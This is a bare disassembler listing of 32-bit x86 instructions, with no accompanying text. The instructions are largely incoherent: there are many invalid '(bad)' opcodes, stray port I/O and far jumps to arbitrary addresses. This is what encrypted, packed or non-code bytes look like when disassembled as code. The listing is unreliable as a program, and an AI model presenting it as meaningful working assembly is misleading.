  41f4aa:	mov    ebp,0xed1b8777
  41f4af:	jp     0x41f4fc
  41f4b1:	ja     0x41f4a6
  41f4b3:	adc    eax,0x1216aab9
  41f4b8:	mov    al,ds:0xd087824e
  41f4bd:	scas   al,BYTE PTR es:[edi]
  41f4be:	adc    ebp,DWORD PTR [ebx]
  41f4c0:	dec    ebx
  41f4c1:	fdivr  DWORD PTR ss:[eax+0x72]
  41f4c5:	mov    ebp,0x83c51ed8
  41f4ca:	into   
  41f4cb:	shl    BYTE PTR ds:0xa7ff7b46,1
  41f4d1:	mov    bh,0x3c
  41f4d3:	sub    BYTE PTR [edx],ah
  41f4d5:	out    dx,eax
  41f4d6:	inc    ebp
  41f4d7:	push   ecx
  41f4d8:	pop    edx
  41f4d9:	xrelease xchg DWORD PTR [ebx-0x1f217f2e],edx
  41f4e0:	into   
  41f4e1:	idiv   DWORD PTR [eax-0x72]
  41f4e4:	call   0x5a4beb9a
  41f4e9:	loopne 0x41f527
  41f4eb:	mov    eax,DWORD PTR [ecx+0x6]
  41f4ee:	int3   
  41f4ef:	or     bh,dh
  41f4f1:	cmp    edx,DWORD PTR [edi]
  41f4f3:	loope  0x41f4a1
  41f4f5:	hlt    
  41f4f6:	pop    esp
  41f4f7:	into   
  41f4f8:	sub    cl,ah
  41f4fa:	les    edi,FWORD PTR [ebp+0x4462e8b2]
  41f500:	add    BYTE PTR [edx+0xa],dl
  41f503:	mov    dh,0x27
  41f505:	and    BYTE PTR [ebp-0x7a4f5854],al
  41f50b:	xor    DWORD PTR [ebp+0x1954e6ae],eax
  41f511:	cmp    BYTE PTR [edi+0x5339693b],bl
  41f517:	test   al,0x5f
  41f519:	mov    BYTE PTR [ecx],dh
  41f51b:	sbb    edi,edx
  41f51d:	fs std 
  41f51f:	gs das 
  41f521:	out    dx,al
  41f522:	xchg   esp,eax
  41f523:	mov    eax,ds:0x9c1664c
  41f528:	mov    ecx,0x9822d8e2
  41f52d:	add    al,0xd6
  41f52f:	mov    eax,DWORD PTR [esi+ecx*2]
  41f532:	outs   dx,DWORD PTR ds:[esi]
  41f533:	adc    ebx,DWORD PTR [eax-0x74]
  41f536:	sub    al,0x6b
  41f538:	dec    esp
  41f539:	adc    BYTE PTR ds:0xa6e4e60d,bh
  41f53f:	(bad)  [edx-0x43985fa9]
  41f545:	fwait
  41f546:	jne    0x41f5a1
  41f548:	push   cs
  41f549:	in     eax,0x3e
  41f54b:	inc    edx
  41f54c:	outs   dx,DWORD PTR ds:[esi]
  41f54d:	nop
  41f54e:	sub    BYTE PTR [ecx+0x7ab4cdca],0x74
  41f555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f556:	jnp    0x41f515
  41f558:	pop    ebp
  41f559:	in     al,0x32
  41f55b:	inc    esp
  41f55c:	or     esp,ebp
  41f55e:	mov    ecx,ebp
  41f560:	(bad)  [ebp-0x3c20d0c4]
  41f566:	mov    ecx,0x2097afc9
  41f56b:	mov    ch,0xf5
  41f56d:	cdq    
  41f56e:	jmp    0x9fcf2a19
  41f573:	mov    bl,0xbf
  41f575:	in     eax,0x65
  41f577:	dec    eax
  41f578:	and    eax,0x9e635c05
  41f57d:	mov    BYTE PTR ds:0x8b1d2581,dl
  41f583:	xor    eax,0x5e75f32
  41f588:	popa   
  41f589:	push   esi
  41f58a:	rol    ch,cl
  41f58c:	inc    ebp
  41f58d:	(bad)  
  41f58e:	into   
  41f58f:	repz sbb DWORD PTR [ebx-0x5c],ecx
  41f593:	lds    ebp,FWORD PTR [edx-0x5b90684a]
  41f599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f59a:	xor    eax,eax
  41f59c:	mov    ebx,DWORD PTR [eax]
  41f59e:	test   eax,0x3c9258b1
  41f5a3:	pop    ebx
  41f5a4:	fcomp  st(3)
  41f5a6:	rol    BYTE PTR [eax+0x2b],0xc9
  41f5aa:	imul   ecx,DWORD PTR [eax],0x43
  41f5ad:	lea    edx,[ebp-0x562f5039]
  41f5b3:	dec    esp
  41f5b4:	cli    
  41f5b5:	sar    dl,cl
  41f5b7:	fucomp st(3)
  41f5b9:	(bad)  
  41f5ba:	and    BYTE PTR [esi+0x7e7addb2],bh
  41f5c0:	loopne 0x41f55c
  41f5c2:	mov    ch,0xe6
  41f5c4:	retf   0x4a50
  41f5c7:	jne    0x41f631
  41f5c9:	fiadd  DWORD PTR [esi+ebp*4-0x1037a8e1]
  41f5d0:	xchg   ecx,eax
  41f5d1:	push   esi
  41f5d2:	imul   esp,DWORD PTR [ebp+esi*4-0x54],0x71
  41f5d7:	repz mov bh,0x59
  41f5da:	test   eax,0x7e6a94cc
  41f5df:	sbb    ebx,esp
  41f5e1:	push   ebx
  41f5e2:	not    DWORD PTR [edi+ebx*4]
  41f5e5:	(bad)  
  41f5e6:	ds int 0x6f
  41f5e9:	push   esi
  41f5ea:	jo     0x41f5b4
  41f5ec:	fcomp  st(2)
  41f5ee:	add    dl,al
  41f5f0:	mov    ah,0xc8
  41f5f2:	fimul  WORD PTR [edx+0x7c4b58a9]
  41f5f8:	xor    ecx,ebp
  41f5fa:	and    bl,BYTE PTR [eax]
  41f5fc:	pop    edx
  41f5fd:	fstp   DWORD PTR [ebx+eax*2]
  41f600:	pushf  
  41f601:	in     eax,dx
  41f602:	cmp    eax,0x2c67ad87
  41f607:	push   edi
  41f608:	(bad)  
  41f609:	push   edx
  41f60a:	loop   0x41f61d
  41f60c:	sub    eax,0xd3e9d71a
  41f611:	loop   0x41f667
  41f613:	mov    esi,eax
  41f615:	scas   al,BYTE PTR es:[edi]
  41f616:	push   esi
  41f617:	pop    esp
  41f618:	repnz lds esp,FWORD PTR [ebx-0x734f66b3]
  41f61f:	mov    dh,0xa6
  41f621:	daa    
  41f622:	imul   edi,esi,0xffffffce
  41f625:	arpl   WORD PTR [di],cx
  41f628:	rol    BYTE PTR ds:0x68c2d5a1,cl
  41f62e:	inc    esp
  41f62f:	mov    bl,0x95
  41f631:	push   esp
  41f632:	pushf  
  41f633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f634:	dec    ebp
  41f635:	rcr    edi,0x4a
  41f638:	xchg   ebp,eax
  41f639:	out    0x11,eax
  41f63b:	pop    esp
  41f63c:	pop    ebx
  41f63d:	mov    ecx,0xacdf76e0
  41f642:	mov    bl,0x3e
  41f644:	loopne 0x41f648
  41f646:	inc    eax
  41f647:	je     0x41f5e7
  41f649:	xor    al,BYTE PTR [ecx-0x8]
  41f64c:	loop   0x41f5e6
  41f64e:	inc    esi
  41f64f:	push   0x6c
  41f651:	loopne 0x41f69e
  41f653:	pop    ebp
  41f654:	mov    BYTE PTR [esp+eax*8],dl
  41f657:	mov    cl,BYTE PTR ds:0x4da2e9c4
  41f65d:	or     eax,0xd0487b87
  41f662:	or     al,0x21
  41f664:	(bad)  
  41f665:	fcomi  st,st(3)
  41f667:	loop   0x41f68d
  41f669:	cmp    esp,edx
  41f66b:	stc    
  41f66c:	aaa    
  41f66d:	js     0x41f5f4
  41f66f:	add    BYTE PTR [esi],ch
  41f671:	imul   edx,edx,0xb1beb21b
  41f677:	out    dx,al
  41f678:	mov    bl,0x9d
  41f67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f67b:	xchg   ecx,eax
  41f67c:	mov    edx,0x593e8b85
  41f681:	and    eax,0x3bc1851
  41f686:	cld    
  41f687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f688:	sub    cl,BYTE PTR [ebp+edx*1+0x9]
  41f68c:	adc    eax,0x3d50edc7
  41f691:	call   0x757a:0x65216dc3
  41f698:	mov    DWORD PTR [eax+esi*1],0x3e07a33d
  41f69f:	xchg   DWORD PTR [esp+ebp*2-0x50],ecx
  41f6a3:	es ss push ebx
  41f6a6:	xor    BYTE PTR [ebx+0x659688fd],ah
  41f6ac:	mov    ds:0x9f7f4d98,al
  41f6b2:	inc    ebx
  41f6b3:	jns    0x41f71e
  41f6b5:	(bad)  
  41f6b6:	jo     0x41f6a4
  41f6b8:	pop    ebp
  41f6b9:	xor    al,0x31
  41f6bb:	add    dl,BYTE PTR [eax-0x38]
  41f6be:	inc    esi
  41f6bf:	imul   ebp,edx,0xfffffffe
  41f6c2:	sub    BYTE PTR [esi-0x1df4786e],dh
  41f6c8:	push   edx
  41f6c9:	push   ebp
  41f6ca:	mov    ah,0xd6
  41f6cc:	sbb    bl,BYTE PTR [edx]
  41f6ce:	xchg   ecx,eax
  41f6cf:	mov    ebp,DWORD PTR [edx-0x5b2800a9]
  41f6d5:	sbb    esi,DWORD PTR [edx-0x30]
  41f6d8:	dec    eax
  41f6d9:	div    BYTE PTR [eax+0x29]
  41f6dc:	mov    ecx,0x4033fee6
  41f6e1:	cwde   
  41f6e2:	outs   dx,BYTE PTR ds:[esi]
  41f6e3:	sub    BYTE PTR [ecx+edi*2+0x626540b3],bl
  41f6ea:	lods   eax,DWORD PTR ds:[esi]
  41f6eb:	popa   
  41f6ec:	test   bl,0x48
  41f6ef:	pop    esi
  41f6f0:	es cli 
  41f6f2:	(bad)  
  41f6f3:	lods   al,BYTE PTR ds:[esi]
  41f6f4:	or     DWORD PTR ds:0xd0b00045,ebp
  41f6fa:	push   cs
  41f6fb:	test   eax,0x635f7f44
  41f700:	ins    BYTE PTR es:[edi],dx
  41f701:	dec    DWORD PTR [esi+0x7f]
  41f704:	xchg   ebp,eax
  41f705:	js     0x41f740
  41f707:	rcl    BYTE PTR [eax+0x3b],0xbc
  41f70b:	in     eax,dx
  41f70c:	fiadd  WORD PTR [edi]
  41f70e:	xchg   ecx,eax
  41f70f:	adc    esp,DWORD PTR [eax+0x8]
  41f712:	int    0x63
  41f714:	and    dl,cl
  41f716:	jecxz  0x41f794
  41f718:	adc    eax,0x3960fbe2
  41f71d:	inc    ebp
  41f71e:	nop
  41f71f:	fistp  WORD PTR [edi]
  41f721:	lds    ebp,FWORD PTR [ebx+0x61]
  41f724:	cmp    DWORD PTR [edx],edi
  41f726:	push   edx
  41f727:	mov    esp,?
  41f729:	sbb    eax,0x68d5e8d2
  41f72e:	fidiv  WORD PTR [ecx]
  41f730:	xor    esp,DWORD PTR [edi+0x7c]
  41f733:	aad    0x51
  41f735:	lods   al,BYTE PTR ds:[esi]
  41f736:	popa   
  41f737:	sti    
  41f738:	push   ebp
  41f739:	push   esp
  41f73a:	in     eax,dx
  41f73b:	jge    0x41f709
  41f73d:	leave  
  41f73e:	sbb    DWORD PTR [edi],esp
  41f740:	mov    al,0xa9
  41f742:	sub    ecx,edx
  41f744:	int3   
  41f745:	mov    eax,ds:0xb9c39de
  41f74a:	push   edi
  41f74b:	xchg   edi,eax
  41f74c:	mov    bh,0x5d
  41f74e:	sar    DWORD PTR [esi-0x4c],1
  41f751:	mov    ds:0x66c1611a,eax
  41f756:	shl    BYTE PTR [ebp-0x34d6dfac],cl
  41f75c:	(bad)  
  41f75d:	mov    WORD PTR [ecx],?
  41f75f:	scas   eax,DWORD PTR es:[edi]
  41f760:	rcr    ecx,1
  41f762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f763:	dec    ebp
  41f764:	push   edi
  41f765:	dec    eax
  41f766:	mov    al,0xb1
  41f768:	xor    al,BYTE PTR [edi]
  41f76a:	(bad)  
  41f76b:	dec    ecx
  41f76c:	push   eax
  41f76d:	jle    0x41f775
  41f76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f770:	add    ebp,0x657dfc93
  41f776:	cld    
  41f777:	jg     0x41f707
  41f779:	mov    esp,0xe7c213c0
  41f77e:	hlt    
  41f77f:	ins    DWORD PTR es:[edi],dx
  41f780:	cmp    eax,0x13b9cc2c
  41f785:	add    al,0x8b
  41f787:	int3   
  41f788:	aam    0x4
  41f78a:	mov    esi,DWORD PTR ds:0x6a1cda27
  41f790:	mov    ds:0x31ca19c4,eax
  41f795:	stc    
  41f796:	addr16 push ebp
  41f798:	sbb    dl,dh
  41f79a:	jbe    0x41f80d
  41f79c:	ror    DWORD PTR [eax+ebx*2-0x44],1
  41f7a0:	fidivr DWORD PTR [ebx+0x6e39ba76]
  41f7a6:	mov    ah,0xf2
  41f7a8:	int3   
  41f7a9:	add    al,0x59
  41f7ab:	fistp  DWORD PTR [eax]
  41f7ad:	stos   BYTE PTR es:[edi],al
  41f7ae:	inc    ebp
  41f7af:	in     al,0x3d
  41f7b1:	mov    ?,esp
  41f7b3:	stos   BYTE PTR es:[edi],al
  41f7b4:	push   ebx
  41f7b5:	call   0x34cc7841
  41f7ba:	jmp    0x2934:0xa30f2e69
  41f7c1:	push   0x6e336eb5
  41f7c6:	jae    0x41f843
  41f7c8:	aam    0x2b
  41f7ca:	sub    BYTE PTR ds:0x81fc8a5c,bl
  41f7d0:	ds sahf 
  41f7d2:	xchg   BYTE PTR [ebp-0x14],dh
  41f7d5:	aaa    
  41f7d6:	xchg   DWORD PTR [ebp-0x3cdfc4b4],edi
  41f7dc:	push   ds
  41f7dd:	int3   
  41f7de:	out    0x80,al
  41f7e0:	into   
  41f7e1:	jbe    0x41f854
  41f7e3:	jge    0x41f7c4
  41f7e5:	scas   al,BYTE PTR es:[edi]
  41f7e6:	or     eax,DWORD PTR [esi]
  41f7e8:	(bad)  
  41f7e9:	std    
  41f7ea:	inc    ebx
  41f7eb:	fmul   st,st(7)
  41f7ed:	mov    ch,BYTE PTR [ebp-0x6]
  41f7f0:	arpl   cx,ax
  41f7f2:	mov    dh,0x1b
  41f7f4:	and    ebp,DWORD PTR [esi]
  41f7f6:	or     BYTE PTR [eax+edx*1-0xa],al
  41f7fa:	pop    es
  41f7fb:	je     0x41f79e
  41f7fd:	loop   0x41f7a7
  41f7ff:	sar    DWORD PTR [eax],cl
  41f801:	test   cl,dl
  41f803:	aas    
  41f804:	scas   al,BYTE PTR es:[edi]
  41f805:	mov    eax,0x5e09cd9d
  41f80a:	cmp    ah,cl
  41f80c:	xlat   BYTE PTR ds:[ebx]
  41f80d:	ins    BYTE PTR es:[edi],dx
  41f80e:	(bad)  
  41f80f:	(bad)
  41f813:	pushf  
  41f814:	shl    BYTE PTR [ecx],cl
  41f816:	iret   
  41f817:	into   
  41f818:	aad    0x9f
  41f81a:	push   cs
  41f81b:	cmp    edi,DWORD PTR [esi-0x41]
  41f81e:	add    bl,BYTE PTR [edx+0x27]
  41f821:	sub    ah,bl
  41f823:	daa    
  41f824:	jbe    0x41f82a
  41f826:	data16 daa 
  41f828:	inc    esp
  41f829:	xor    al,0xb
  41f82b:	(bad)  
  41f82c:	mov    cl,0x71
  41f82e:	xchg   edx,eax
  41f82f:	hlt    
  41f830:	xlat   BYTE PTR ds:[ebx]
  41f831:	push   0xf
  41f833:	xchg   ecx,eax
  41f834:	cmp    BYTE PTR [edx],bh
  41f836:	aad    0xbb
  41f838:	inc    edi
  41f839:	ins    BYTE PTR es:[edi],dx
  41f83a:	imul   esi,DWORD PTR [eax+0x7f2801cf],0x31
  41f841:	lock adc edi,DWORD PTR [ecx]
  41f844:	dec    ebp
  41f845:	jg     0x41f866
  41f847:	fmulp  st(7),st
  41f849:	push   eax
  41f84a:	les    edi,FWORD PTR [eax+0x1a88dec7]
  41f850:	jmp    0x8cca:0x58c34dce
  41f857:	fstp   DWORD PTR [ecx+0x7369cbff]
  41f85d:	pop    edi
  41f85e:	(bad)  [eax-0x5076cbea]
  41f864:	enter  0x4bfc,0x29
  41f868:	arpl   bp,bx
  41f86a:	add    ah,al
  41f86c:	mov    bl,0x13
  41f86e:	repnz dec esi
  41f870:	mov    BYTE PTR [edx*1-0x1fb1b3cc],dh
  41f877:	push   cs
  41f878:	pop    esp
  41f879:	or     al,0xc2
  41f87b:	(bad)  
  41f87c:	mov    al,ds:0x53da9e22
  41f881:	sbb    al,0x83
  41f883:	jnp    0x41f8fc
  41f885:	mov    ebp,0x1b6aaaab
  41f88a:	push   cs
  41f88b:	mov    cl,0x5
  41f88d:	dec    esi
  41f88e:	pop    ds
  41f88f:	cld    
  41f890:	les    edx,FWORD PTR [edi]
  41f892:	mov    ss,WORD PTR [ebx+0x5b3f68e]
  41f898:	in     al,dx
  41f899:	mov    ch,0x5d
  41f89b:	(bad)  
  41f89c:	ins    BYTE PTR es:[edi],dx
  41f89d:	push   0xffffffab
  41f89f:	cli    
  41f8a0:	mov    esp,0xe51b5735
  41f8a5:	mov    al,0xa3
  41f8a7:	call   0x1430:0x46886c61
  41f8ae:	fld    QWORD PTR [esi-0x5156c20d]
  41f8b4:	jmp    0x5c6b:0x26bff876
  41f8bb:	popa   
  41f8bc:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41f8be:	not    DWORD PTR [esi+eiz*2+0x37]
  41f8c2:	mul    BYTE PTR [edx+0x29]
  41f8c5:	jl     0x41f941
  41f8c7:	inc    ebp
  41f8c8:	retf   
  41f8c9:	inc    ebp
  41f8ca:	jle    0x41f943
  41f8cc:	data16 scas al,BYTE PTR es:[edi]
  41f8ce:	mov    eax,0xec970a5f
  41f8d3:	std    
  41f8d4:	icebp  
  41f8d5:	sbb    al,0xff
  41f8d7:	and    al,0x1e
  41f8d9:	sbb    BYTE PTR [ecx-0x72f32e75],ah
  41f8df:	jae    0x41f8d1
  41f8e1:	adc    BYTE PTR [edi-0x3b791cc2],al
  41f8e7:	xchg   esp,esp
  41f8e9:	cmp    eax,0xa2f2da8b
  41f8ee:	data16 stos BYTE PTR es:[edi],al
  41f8f0:	mov    DWORD PTR ds:0x30177289,esi
  41f8f6:	dec    ebx
  41f8f7:	mov    ebx,0xcbd5a154
  41f8fc:	xchg   esp,eax
  41f8fd:	inc    bh
  41f8ff:	jg     0x41f8e2
  41f901:	push   0xffffffbd
  41f903:	scas   eax,DWORD PTR es:[edi]
  41f904:	mov    cs,eax
  41f906:	jl     0x41f8d1
  41f908:	jae    0x41f8a8
  41f90a:	jno    0x41f941
  41f90c:	int3   
  41f90d:	pop    ebp
  41f90e:	adc    eax,0xfa7a1974
  41f913:	pushf  
  41f914:	jbe    0x41f905
  41f916:	ja     0x41f971
  41f918:	fisubr DWORD PTR [eax]
  41f91a:	cmp    eax,0x7cbe09e0
  41f91f:	mov    bh,0xc
  41f921:	adc    eax,0x7b74db97
  41f926:	mov    WORD PTR [esi-0x608ddba6],?
  41f92c:	mov    edx,0x844268f8
  41f931:	hlt    
  41f932:	xor    eax,edi
  41f934:	test   eax,0xb6a6b28e
  41f939:	jge    0x41f99d
  41f93b:	push   0xdc370ce2
  41f940:	xor    al,0x4f
  41f942:	push   ecx
  41f943:	in     al,dx
  41f944:	xchg   esp,eax
  41f945:	sub    BYTE PTR [esi+0x5],ch
  41f948:	jmp    0x197d7e45
  41f94d:	xchg   ecx,eax
  41f94e:	jns    0x41f8d2
  41f950:	and    DWORD PTR [edx+0x58],ebp
  41f953:	retf   0xa7aa
  41f956:	ds stos BYTE PTR es:[edi],al
  41f958:	push   esi
  41f959:	mov    BYTE PTR [edx],bl
  41f95b:	or     ah,BYTE PTR [ebx-0x26]
  41f95e:	and    dl,BYTE PTR [edi+0x897a648]
  41f964:	das    
  41f965:	je     0x41f9de
  41f967:	mov    edx,0x49c94ad2
  41f96c:	dec    esi
  41f96d:	fcom   QWORD PTR [edx-0x70]
  41f970:	popa   
  41f971:	xchg   ecx,eax
  41f972:	in     al,dx
  41f973:	stos   BYTE PTR es:[edi],al
  41f974:	pop    eax
  41f975:	rol    DWORD PTR [eax+0x39],0x81
  41f979:	push   cs
  41f97a:	or     eax,ebp
  41f97c:	ror    BYTE PTR [ebx-0x4373fd13],0xa2
  41f983:	xlat   BYTE PTR ds:[ebx]
  41f984:	cmc    
  41f985:	dec    ebp
  41f986:	popa   
  41f987:	push   edx
  41f988:	cdq    
  41f989:	mov    eax,ds:0x4029137e
  41f98e:	fs cmp cl,0x2f
  41f992:	sbb    al,bl
  41f994:	in     al,0x90
  41f996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f997:	ds ins DWORD PTR es:[edi],dx
  41f999:	and    eax,0xba31ef06
  41f99e:	into   
  41f99f:	cmp    DWORD PTR es:[edx-0x11],0x7e734e82
  41f9a7:	sar    BYTE PTR [edx-0x42],1
  41f9aa:	adc    eax,0x469a05a9
  41f9af:	cmc    
  41f9b0:	(bad)  
  41f9b1:	ins    BYTE PTR es:[edi],dx
  41f9b2:	cld    
  41f9b3:	cmp    BYTE PTR [ecx+0x1e0b7b14],ah
  41f9b9:	xlat   BYTE PTR ds:[ebx]
  41f9ba:	jl     0x41f9e6
  41f9bc:	out    0x5c,eax
  41f9be:	pusha  
  41f9bf:	fisttp WORD PTR [ecx-0x5e28b426]
  41f9c5:	aaa    
  41f9c6:	push   es
  41f9c7:	xlat   BYTE PTR ds:[ebx]
  41f9c8:	mov    cl,0xdd
  41f9ca:	mov    ds:0xac952f53,eax
  41f9cf:	push   ecx
  41f9d0:	lds    ebp,FWORD PTR [ecx]
  41f9d2:	or     dh,BYTE PTR [eax+0x18972a1a]
  41f9d8:	fild   QWORD PTR [edx+0x26]
  41f9db:	pop    eax
  41f9dc:	mov    BYTE PTR [edx+0xe],ch
  41f9df:	xchg   ecx,eax
  41f9e0:	or     ah,ch
  41f9e2:	sti    
  41f9e3:	loopne 0x41fa35
  41f9e5:	fisub  DWORD PTR [eax-0x6b81c6ad]
  41f9eb:	gs dec ebx
  41f9ed:	and    dl,BYTE PTR [edx+0x54]
  41f9f0:	fstp   DWORD PTR [edi-0x1944ffcb]
  41f9f6:	retf   
  41f9f7:	push   0xfffffff9
  41f9f9:	das    
  41f9fa:	jmp    0x56b2957f
  41f9ff:	ins    BYTE PTR es:[edi],dx
  41fa00:	and    eax,0x926fa54
  41fa05:	hlt    
  41fa06:	add    ebp,DWORD PTR [esi+0x8d16076]
  41fa0c:	lods   eax,DWORD PTR ds:[esi]
  41fa0d:	sub    ah,BYTE PTR [eax-0x2e]
  41fa10:	mov    al,0x9c
  41fa12:	std    
  41fa13:	or     DWORD PTR [edi],edi
  41fa15:	mov    bh,BYTE PTR [esi+0x7366772b]
  41fa1b:	jge    0x41fa76
  41fa1d:	mov    ecx,0x549c7b83
  41fa22:	sbb    al,0x41
  41fa24:	mov    ch,0x80
  41fa26:	mov    dl,0xfc
  41fa28:	mov    ds:0x44aff68c,eax
  41fa2d:	repnz sti 
  41fa2f:	ins    DWORD PTR es:[edi],dx
  41fa30:	inc    eax
  41fa31:	mov    eax,0xcfad2708
  41fa36:	shr    DWORD PTR [eax],0x1
  41fa39:	daa    
  41fa3a:	imul   edi,esi,0x96d58c58
  41fa40:	loopne 0x41fa0c
  41fa42:	jne    0x41f9c6
  41fa44:	jae    0x41faa0
  41fa46:	adc    BYTE PTR [ebx+0x59],dh
  41fa49:	ja     0x41fa83
  41fa4b:	repnz hlt 
  41fa4d:	imul   eax,DWORD PTR [edx],0x58de65bb
  41fa53:	cmp    eax,DWORD PTR [esi+0x2444d878]
  41fa59:	mov    esi,0x754cb346
  41fa5e:	jmp    0x41fa6b
  41fa60:	push   eax
  41fa61:	out    0xc4,eax
  41fa63:	adc    bl,ah
  41fa65:	loop   0x41faa5
  41fa67:	fist   DWORD PTR ss:[ebp+0x29]
  41fa6b:	out    dx,al
  41fa6c:	out    0x4,eax
  41fa6e:	dec    ebx
  41fa6f:	rcr    ah,1
  41fa71:	mov    al,0xd
  41fa73:	shl    DWORD PTR [ebx+0x3c],0xfa
  41fa77:	mov    ebx,esp
  41fa79:	mov    bl,0x91
  41fa7b:	pop    eax
  41fa7c:	mov    ebx,0x3582aabd
  41fa81:	fadd   DWORD PTR [ecx-0xc61ff20]
  41fa87:	xchg   esp,eax
  41fa88:	push   esi
  41fa89:	mul    DWORD PTR [ebx+0x21]
  41fa8c:	out    0xfc,al
  41fa8e:	mov    ecx,ss
  41fa90:	xlat   BYTE PTR ds:[ebx]
  41fa91:	sub    bh,BYTE PTR [ecx-0x5e]
  41fa94:	jno    0x41fa71
  41fa96:	fstp   st(7)
  41fa98:	test   BYTE PTR [ecx],dh
  41fa9a:	mov    bl,0x63
  41fa9c:	xchg   esp,eax
  41fa9d:	call   0xf382:0x17585e84
  41faa4:	sbb    esp,edi
  41faa6:	xor    BYTE PTR [edx+eax*8+0x27fb0203],ch
  41faad:	or     ebx,ebp
  41faaf:	es push edi
  41fab1:	and    ah,bl
  41fab3:	pop    edi
  41fab4:	out    dx,al
  41fab5:	pop    ebx
  41fab6:	sahf   
  41fab7:	in     eax,0xce
  41fab9:	xchg   esi,eax
  41faba:	pop    ebp
  41fabb:	pop    ss
  41fabc:	scas   eax,DWORD PTR es:[edi]
  41fabd:	mov    bh,0xbf
  41fabf:	ss ss mov dl,0x8e
  41fac3:	cmp    DWORD PTR [ebx-0x1dc58f00],edi
  41fac9:	mov    WORD PTR [ecx],es
  41facb:	inc    ecx
  41facc:	out    0xd5,al
  41face:	xor    BYTE PTR [ebx-0x31],al
  41fad1:	sbb    eax,DWORD PTR [ecx-0x45]
  41fad4:	stc    
  41fad5:	sbb    BYTE PTR [eax-0x52e6a42f],ah
  41fadb:	xchg   edx,eax
  41fadc:	cli    
  41fadd:	leave  
  41fade:	push   cs
  41fadf:	fidivr DWORD PTR [esi]
  41fae1:	mov    WORD PTR [eax+esi*4-0x64],cs
  41fae5:	push   edx
  41fae6:	and    al,0xba
  41fae8:	fcomp  QWORD PTR [esp+ebp*2]
  41faeb:	imul   edx,DWORD PTR [ebx-0x2f],0x6dde975d
  41faf2:	mov    cl,0x97
  41faf4:	aad    0xc3
  41faf6:	or     ecx,DWORD PTR [ebx+0x35]
  41faf9:	mov    bh,0x11
  41fafb:	push   ds
  41fafc:	(bad)  
  41fafd:	fs aam 0xc4
  41fb00:	pop    ecx
  41fb01:	xchg   ecx,eax
  41fb02:	cmp    BYTE PTR ds:0x4e932d52,bh
  41fb08:	xor    cl,BYTE PTR [si]
  41fb0b:	stc    
  41fb0c:	ins    BYTE PTR es:[edi],dx
  41fb0d:	fldenv [edi-0x3562a60f]
  41fb13:	inc    ebp
  41fb14:	add    DWORD PTR [ebx-0x327ee5e0],ecx
  41fb1a:	ret    
  41fb1b:	sub    ch,ah
  41fb1d:	jmp    0x41fb6e
  41fb1f:	inc    ebx
  41fb20:	ins    BYTE PTR es:[edi],dx
  41fb21:	lahf   
  41fb22:	bound  esi,QWORD PTR [ebx+0x42]
  41fb25:	add    DWORD PTR [ebx+0x58635412],ebp
  41fb2b:	outs   dx,DWORD PTR ds:[esi]
  41fb2c:	inc    edx
  41fb2d:	lods   eax,DWORD PTR ds:[esi]
  41fb2e:	nop
  41fb2f:	dec    ebp
  41fb30:	je     0x41fac3
  41fb32:	cmp    DWORD PTR [edi],ebx
  41fb34:	les    esi,FWORD PTR [ebx+0x27]
  41fb37:	cmp    eax,0x97be3931
  41fb3c:	div    BYTE PTR [ebx-0x5d]
  41fb3f:	adc    DWORD PTR [eax+0x2b6f28d],eax
  41fb45:	sub    DWORD PTR [edi],ebp
  41fb47:	stos   DWORD PTR es:[edi],eax
  41fb48:	push   0xffffff96
  41fb4a:	dec    eax
  41fb4b:	imul   ebp,DWORD PTR ds:0x1baebe55,0x26
  41fb52:	div    DWORD PTR [ebp+0x2d]
  41fb55:	shl    DWORD PTR [edx],0x57
  41fb58:	test   al,0x5d
  41fb5a:	data16 out 0x8f,al
  41fb5d:	fiadd  DWORD PTR [eax]
  41fb5f:	mov    dl,0xcd
  41fb61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb62:	sahf   
  41fb63:	mov    eax,ds:0xab32d74c
  41fb68:	cli    
  41fb69:	sub    BYTE PTR ds:0x3d0e695d,dl
  41fb6f:	pop    esi
  41fb70:	inc    esp
  41fb71:	xor    al,0xe5
  41fb73:	mov    al,al
  41fb75:	jae    0x41fb33
  41fb77:	jl     0x41fb8d
  41fb79:	xor    eax,0x6d5da512
  41fb7e:	mov    ah,0xcc
  41fb80:	adc    al,0x76
  41fb82:	sbb    ebx,DWORD PTR [eax+0x55abf224]
  41fb88:	adc    BYTE PTR [edx-0x2b],bh
  41fb8b:	aaa    
  41fb8c:	and    ebp,DWORD PTR [ecx+0x9c86296]
  41fb92:	leave  
  41fb93:	jecxz  0x41fbcf
  41fb95:	jns    0x41fb29
  41fb97:	ret    
  41fb98:	mov    al,ds:0xa91a7f52
  41fb9d:	jbe    0x41fb81
  41fb9f:	sub    al,0x6f
  41fba1:	dec    ecx
  41fba2:	mov    esp,0x1ce096a7
  41fba7:	repz cmp al,BYTE PTR [edi]
  41fbaa:	sbb    al,0xa6
  41fbac:	ja     0x41fbc8
  41fbae:	xor    eax,0xadc3d7c2
  41fbb3:	mov    WORD PTR [edi-0x1b],ss
  41fbb6:	add    al,0x44
  41fbb8:	sahf   
  41fbb9:	mov    cl,BYTE PTR [edi-0x1a]
  41fbbc:	ins    DWORD PTR es:[edi],dx
  41fbbd:	xchg   DWORD PTR [ebx-0x5a],ebp
  41fbc0:	push   edi
  41fbc1:	cdq    
  41fbc2:	jo     0x41fb6b
  41fbc4:	and    eax,0x81177c7
  41fbc9:	cmc    
  41fbca:	sbb    eax,0xeb4a1dd1
  41fbcf:	add    dh,BYTE PTR [ecx+0x8c1e484]
  41fbd5:	loope  0x41fbbc
  41fbd7:	repnz or esi,DWORD PTR [esp+ebp*2-0x29]
  41fbdc:	push   ss
  41fbdd:	jl     0x41fb96
  41fbdf:	mov    esi,0xfbc716a9
  41fbe4:	xchg   ebx,eax
  41fbe5:	sar    esp,0x39
  41fbe8:	adc    eax,0xf6739863
  41fbed:	add    BYTE PTR [ebx-0x19],bh
  41fbf0:	shr    BYTE PTR [ecx],1
  41fbf2:	arpl   WORD PTR [esi+0x71131385],bx
  41fbf8:	and    al,0x5b
  41fbfa:	ret    
